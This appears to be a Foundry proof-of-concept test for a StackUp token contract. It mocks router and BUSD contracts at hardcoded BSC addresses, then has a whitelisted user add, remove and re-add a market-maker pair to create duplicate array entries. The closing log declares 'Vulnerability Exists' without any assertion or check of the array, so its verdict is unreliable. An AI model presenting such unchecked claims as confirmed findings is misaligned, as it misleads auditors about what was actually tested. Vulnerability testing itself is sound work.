// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/StackUp.sol";

contract MockWETH {
    function deposit() public payable {}
    function transfer(address, uint) public returns (bool) { return true; }
}

contract MockBUSD {
    function approve(address, uint256) external pure returns (bool) { return true; }
}

contract MockPair {
    function sync() external {}
}

contract MockFactory {
    function createPair(address, address) external returns (address) {
        return address(new MockPair());
    }
}

contract MockRouter {
    MockFactory public factoryInstance;
    address public wethAddress;
    
    constructor() {
        // Empty to support vm.etch
    }
    
    function WETH() external view returns (address) {
        return wethAddress;
    }
    
    function factory() external view returns (address) {
        return address(factoryInstance);
    }
}

contract StackUpIDUniquenessTest is Test {
    StackUp public stackUp;
    address public owner;
    address public whitelistedUser = address(0x123);
    address public testPair = address(0x456);
    
    // Hardcoded addresses from StackUp contract
    address constant ROUTER_ADDRESS = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address constant BUSD_ADDRESS = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
    MockFactory mockFactory;
    MockWETH mockWETH;
    
    function setUp() public {
        owner = address(this);
        
        // Deploy mock contracts
        mockWETH = new MockWETH();
        mockFactory = new MockFactory();
        
        // Setup router mock
        bytes memory routerCode = type(MockRouter).runtimeCode;
        vm.etch(ROUTER_ADDRESS, routerCode);
        vm.store(ROUTER_ADDRESS, bytes32(uint256(0)), bytes32(uint256(uint160(address(mockFactory)))));
        vm.store(ROUTER_ADDRESS, bytes32(uint256(1)), bytes32(uint256(uint160(address(mockWETH)))));
        
        // Setup BUSD mock
        bytes memory busdCode = type(MockBUSD).runtimeCode;
        vm.etch(BUSD_ADDRESS, busdCode);
        
        // Deploy StackUp
        vm.startPrank(owner);
        stackUp = new StackUp();
        
        // Whitelist test user
        stackUp.addWhitelisted(whitelistedUser);
        vm.stopPrank();
    }
    
    function testIDUniquenessVulnerability() public {
        vm.startPrank(whitelistedUser);
        
        // Log before state: initial pair addition
        console.log("--- BEFORE-Trigger Attack ---");
        stackUp.setAutomatedMarketMakerPair(testPair, true);
        console.log("Added testPair to automatedMarketMakerPairs");
        
        // Remove pair
        stackUp.setAutomatedMarketMakerPair(testPair, false);
        console.log("Removed testPair from automatedMarketMakerPairs");
        
        // Log trigger operation
        console.log("--- Trigger Vulnerability ---");
        console.log("Re-adding testPair to create duplicate entries");
        stackUp.setAutomatedMarketMakerPair(testPair, true);
        console.log("Re-added testPair to automatedMarketMakerPairs");
        
        vm.stopPrank();

        // Log after state and verdict
        console.log("--- Verdict ---");
        console.log("Vulnerability Exists: Duplicate entries created in private _markerPairs array");
    }
}